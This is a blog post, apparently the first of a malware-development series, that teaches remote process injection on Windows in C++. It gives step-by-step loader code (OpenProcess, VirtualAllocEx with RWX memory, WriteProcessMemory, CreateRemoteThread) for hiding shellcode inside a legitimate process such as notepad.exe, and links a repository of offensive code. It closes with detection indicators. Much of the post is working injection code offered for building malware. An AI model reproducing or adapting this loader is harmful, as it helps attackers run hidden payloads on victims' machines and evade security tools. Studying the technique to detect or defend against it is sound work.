---
title: Remote process injection
published: true
categories: [Malware dev, C++]
tags: [Malware dev, C++, Process injection]

pin: false
image:
  path: https://github.com/Krypteria/Offensive_CPP/assets/55555187/e7d5eef8-559c-4c02-b2a2-eeb0462fa334
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

This is the first post of a few that I will be publishing related to malware development (or attempt to) in C++. This series of posts have no pretension, my main goal is to publish my progress in this area as a blog and use them to consolidate my knowledge, if they can also be useful to someone else, good ^^. With all this clarified, this first post will deal with the remote process injection technique.

Remote process injection is one of the oldest injection techniques in existence and although it is not extremely sophisticated (due to the fact that in the past there were no security measures as effective in detecting this type of technique as modern EDRs) it is a good place to start this series to gain knowledge that will be necessary in more complex techniques (as they say in my country, you should not start the house from the roof).

Let's start with the basics, what does the remote process injection technique consist of? 

This technique consists, roughly speaking, of hiding the execution of a set of instructions within a legitimate process, trying to make the execution as unnoticed as possible. For example, let's take the following images:

![sus_binary](https://github.com/Krypteria/Offensive_CPP/assets/55555187/ee424e68-7e58-4271-98d7-e762eb07c417)

In this image we can see a custom binary that opens a cmd.exe process which in turn runs a conhost.exe. At first glance it looks quite suspicious. Now let's look at the next image:

![less_sus_binary](https://github.com/Krypteria/Offensive_CPP/assets/55555187/dd4cec98-eb55-4c3c-b270-7134b4ee8655)

While it is true that we have the same scenario, (a binary running cmd.exe and in turn conhost.exe), this time it is not an ordinary binary, it is an operating system binary, which could raise doubts about its legitimacy.

Now that we have seen the potential of this technique, let's see how we can program it in C++ and what is the logic behind it.

Let's start, the first thing we have to do is to obtain a Handle of the process we want to use. A Handle of a process is nothing more than an identifier that allows us to interact with it, you can see it as the descriptor of a file if we were working with files. 

To obtain this Handle I will make use of the [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function of the Windows API (it is vital to familiarise ourselves with the official Windows documentation as we will spend many hours reading it).

```c++
DWORD pid = atoi(argv[1]);

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

if (hProcess == NULL){
    printf("%s Cannot get the handle to the process\n", err);
    return EXIT_FAILURE;
}

printf("%s Handle to the process obtained\n", ok);
```

Once we have obtained the Handle, we can start interacting with the process :). 

The next step is to allocate memory in the remote process to host our payload there. To do this, we will use the [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function of the Windows API, another alternative could be the **NtAllocateVirtualMemory** function of the **Undocumented Windows API**. The choice of which function to use in the end will depend on the needs we have.

```c++
unsigned char shellcode[]="Your epic shellcode here";

LPVOID bAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

if(bAddress == NULL){
    printf("%s Cannot allocate memory for the shellcode\n", err);
    return EXIT_FAILURE;
}

printf("%s Memory allocated succesfully at %p\n", ok, bAddress);
```

The VirtualAllocEx function returns a pointer to the beginning of the memory space we have reserved. We will use this pointer to tell the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function where we want to write the contents of the shellcode variable. 

```c++
if(WriteProcessMemory(hProcess, bAddress, shellcode, sizeof(shellcode), NULL) == 0){
    printf("%s Cannot write on memory, error %s\n", err, GetLastError());
    return EXIT_FAILURE;
}

printf("%s Memory written succesfully\n", ok);
```

Once we have the shellcode content written in the process memory, the only thing we need to do to execute it is simply to create a Thread that starts its execution at the memory address where the shellcode is hosted. To do this, we will again use the pointer to the memory address returned by VirtualAllocEx and the Handle obtained by OpenProcess in the [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) function.

```c++
HANDLE hRemote = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)bAddress, NULL, 0, NULL);

if(hRemote == NULL){
    printf("%s Cannot get the handle to the remote process\n", err);
    return EXIT_FAILURE;
}

printf("%s Remote thread executed succesfully\n", ok);

CloseHandle(hRemote);
CloseHandle(hProcess);

return EXIT_SUCCESS;
```

Once we have completed these steps, we compile the program and we will have an executable capable of performing this technique. The complete code can be found in the [Offensive CPP](https://github.com/Krypteria/Offensive_CPP) repository on my Github

Let's see what the execution of the complete code looks like:
![remote_process_injection](https://github.com/Krypteria/Offensive_CPP/assets/55555187/b9ff587f-b3e8-419b-bcbe-272d2a5b1895)

As you can see in the image, we have managed to inject the shellcode in the process notepad.exe, if we go to the memory address reserved by VirtualAllocEx we can observe several things

- The memory space has been reserved as type **Private: Commit**
- The memory space has **RWX permissions**
- The shellcode has been written correctly ( as a payload created by msfvenom, it is obfuscated).

These three observations already show us some of the problems of this technique in terms of evading modern security measures. Just with what we have discussed in the previous paragraph we can already extract the following IOCs (Indicators of Compromise):

- Memory allocation using win32 API calls
- Creation of a Thread that points to a private memory space
- Private memory space with execution permissions

There are many more IOCs you can find in this post by [Mitre](https://attack.mitre.org/techniques/T1055/)

With all of this, it is fundamental to understand this technique for future sophistications or more advanced techniques that I will publish :)
